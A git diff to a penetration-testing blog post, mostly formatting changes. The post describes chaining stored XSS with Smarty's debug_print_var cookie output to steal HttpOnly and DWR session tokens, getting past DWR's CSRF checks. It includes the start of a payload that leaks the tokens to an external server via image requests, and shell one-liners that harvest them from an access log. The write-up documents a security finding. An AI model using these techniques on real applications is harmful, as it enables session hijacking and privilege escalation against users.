@@ -29,17 +29,17 @@ After recovering from the realization that I would likely be left shell-less (ju
 1.	Smarty has a wonderful built-in SSRF just waiting to SSRF things (A write-up for another time perhaps)! The “{fetch}” tag is ripe for the abuse. [Smarty Fetch API Documentation](https://www.smarty.net/docsv2/en/api.fetch.tpl)
 2.	Smarty has a built-in PHP reserved variable, "{$smarty}", that can be used to access environment and request variables. One of the variables that "{$smarty}" had access to was "cookies", which as the name indicates allows for Smarty to have access to a users' session cookies via HTTP.
 3.	Smarty “literal” tags.
-``{literal} tags allow a block of data to be taken literally. This is typically used around Javascript or stylesheet blocks where {curly braces} would interfere with the template delimiter syntax. Anything within {literal}{/literal} tags is not interpreted but displayed as-is.``
+```{literal} tags allow a block of data to be taken literally. This is typically used around Javascript or stylesheet blocks where {curly braces} would interfere with the template delimiter syntax. Anything within {literal}{/literal} tags is not interpreted but displayed as-is.```
 4.	If enabled, a Smarty Debug Console exists
-``{\$smarty.cookies|@debug_print_var}``
+```{\$smarty.cookies|@debug_print_var}```
 -	debug_print_var - formats variable contents for display in the console otherwise using the "{$smarty}" variables causes a popup window to display the desired values.
-[Smarty Debugging Console Documentation](https://www.smarty.net/docsv2/en/chapter.debugging.console.tpl)
+![Smarty Debugging Console Documentation](https://www.smarty.net/docsv2/en/chapter.debugging.console.tpl)
 
 Next on the technological notes front, it was observed that anytime that an end user made changes to the application a different type of request, specifically a Direct Web Remoting (DWR) request was made to facilitate the changes. Additionally, each of these requests had multiple “Session” looking cookies including: DWRSESSIONID, JSESSIONID and scriptSessionId. Prior to this testing I had never seen Direct Web Remoting. An example “DWR” request follows.
 
 ![dwr-example.png]({{site.baseurl}}/assets/media/posts/redacted/dwr-example.png)
 
-Crazy looking requests aside, more was absolutely necessary before I could move past this odd request type. Borrowing some words and descriptions from [DWR Documentation](http://directwebremoting.org/dwr/index.html), basically, DWR is a Java library that enables Java on the server and JavaScript in a browser to interact. DWR uses a randomly generated server-side secret in each HTTP POST request that allows the server to reject requests as invalid before any actions takes place, denying forged requests. Smells like CSRF mitigation. The way that this is accomplished is the randomly generated server-side secret in each POST request body is compared with a cookie in the request. The idea being that an attacker attempting to conduct a CSRF attack (or a CSRFer if you will) does not natively have the ability to add a cookie to a victim’s request.
+Crazy looking requests aside, more was absolutely necessary before I could move past this odd request type. Borrowing some words and descriptions from ![DWR Documentation](http://directwebremoting.org/dwr/index.html), basically, DWR is a Java library that enables Java on the server and JavaScript in a browser to interact. DWR uses a randomly generated server-side secret in each HTTP POST request that allows the server to reject requests as invalid before any actions takes place, denying forged requests. Smells like CSRF mitigation. The way that this is accomplished is the randomly generated server-side secret in each POST request body is compared with a cookie in the request. The idea being that an attacker attempting to conduct a CSRF attack (or a CSRFer if you will) does not natively have the ability to add a cookie to a victim’s request.
 
 So all in all great news with the Smarty Template errors that were actively mocking me, along with the Java and the protections from all of those CSRFers out there. With those observations made, that Stored XSS began seeming a whole lot better. However, even trying to pull off a standard Stored XSS there was a problem (isn’t there always?) and more than one (isn’t there always?)! 
 
@@ -47,15 +47,18 @@ Because DWR was used to facilitate changes to the application, there were three 
 
 **Item #1: DWRSESSIONID – Problem / No Problem**
 
-No problem. Obtaining the DWRSESSIONID session token could be obtained two different ways. Both via XSS and via the {$smarty.cookies|@debug_print_var}. For simplicity, it was obtained via the stored XSS.
+No problem. Obtaining the DWRSESSIONID session token could be obtained two different ways. Both via XSS and via the ``{$smarty.cookies|@debug_print_var}``. For simplicity, it was obtained via the stored XSS.
 
 **Item #1 Solution:**
+
 Nothing special needed outside of XSS.
 
 **Item #2: JSESSIONID – Problem / No Problem**
+
 Problem. XSS would not be able to steal the JSESSIONID because its corresponding cookie was marked with the "HTTPOnly" flag. 
 
 **Item #2 Solution:**
+
 Despite the HTTP Cookie flags being marked appropriately (e.g. HttpOnly), this JSESSIONID can be accessed with Smarty by a user with our “medium-ish” privileges since these privileges allowed for the creation of custom HTML. So using Smarty the JSESSIONID could be obtained by adding the following snippet to a custom HTML page: {$smarty.cookies|@debug_print_var} . This would yield the following information:
 
 ![Smarty_cookies_debug_print.png]({{site.baseurl}}/assets/media/posts/redacted/Smarty_cookies_debug_print.png)
@@ -67,12 +70,13 @@ After displaying these values, Javascript could then be used to read the HTML so
 Problem. The scriptSessionId could not be obtained via XSS as it was a value sent within each HTTP POST request. If a DWR request is made without including the "dwr.engine._scriptSessionId" a java.lang.SecurityException occurs with a message stating that a CSRF Security Error as occurred (Stupid CSRFers). 
 
 **Item #3 Solution:**
+
 The scriptSessionId is the DWRSESSIONID concatenated with a "/" and a "_pageId" variable the end user does not know about (DWRSESSIONID + "/" + dwr.engine._pageId). The value that is calculated would be incredibly difficult to guess based on its complexity. The Javascript source showed how this value is calculated in "/dwrS/engine.js" with the following snippet:
-``dwr.engine._pageId = dwr.engine.util.tokenify(new Date().getTime()) + "-" + dwr.engine.util.tokenify(Math.random() * 1E16);``
+```dwr.engine._pageId = dwr.engine.util.tokenify(new Date().getTime()) + "-" + dwr.engine.util.tokenify(Math.random() * 1E16);```
 
 In order to obtain the scriptSessionId, the application could be used against itself. So the Javascript used to calculate the value must be imported into the final payload ``<script src='/dwrS/engine.js'></script>.`` Next, an XMLHttpRequest (XHR) object must be created to make a secondary request to the server at "/redacted.action". This was done to load the content of this page without having to do a full page refresh. This action will allow access to both the dwr.engine._dwrSessionId + "/" + dwr.engine._pageId variables to be obtained.
 
-With the solution to obtaining all three of the previously mentioned items, the following payload was used to leak each value to an external server using "new Image().src=" Javascript references. 
+With the solution to obtaining all three of the previously mentioned items, the following payload was used to leak each value to an external server using ``new Image().src=`` Javascript references. 
 
 ```
 var a = document.getElementById('content-marker');
@@ -118,8 +122,8 @@ So to sum up the vulnerability, using a combination of features from the Smarty 
 ![apache-access-log.png]({{site.baseurl}}/assets/media/posts/redacted/apache-access-log.png)
 
 3.	The ”medium-ish” privileged user can then harvest the goods from their logs. Perhaps similar to what is shown below: On the external Apache web server something along the lines of the following could be done to harvest the necessary items:
-``alias urldecode='python -c "import sys, urllib as ul; print ul.unquote_plus(sys.argv[1])"'``
-``for x in `cut -d ' ' -f7 access.log | cut -d\? -f2`; do urldecode $x;done > these && sed 's/"//g' these | sed 's/ => //g' > sessionvars` && cat sessionvars``
+```alias urldecode='python -c "import sys, urllib as ul; print ul.unquote_plus(sys.argv[1])"'```
+```for x in `cut -d ' ' -f7 access.log | cut -d\? -f2`; do urldecode $x;done > these && sed 's/"//g' these | sed 's/ => //g' > sessionvars` && cat sessionvars```
 4.	Take the output from the console and insert the values in their appropriate positions in the “medium-ish” privileges malicious HTTP requests.
 ![sessionvars.png]({{site.baseurl}}/assets/media/posts/redacted/sessionvars.png)
 5.	And now using our “sessionvars” we can make privileged requests as an exploited user’s  privilege level. Here’s to hoping for full Admin privileges!
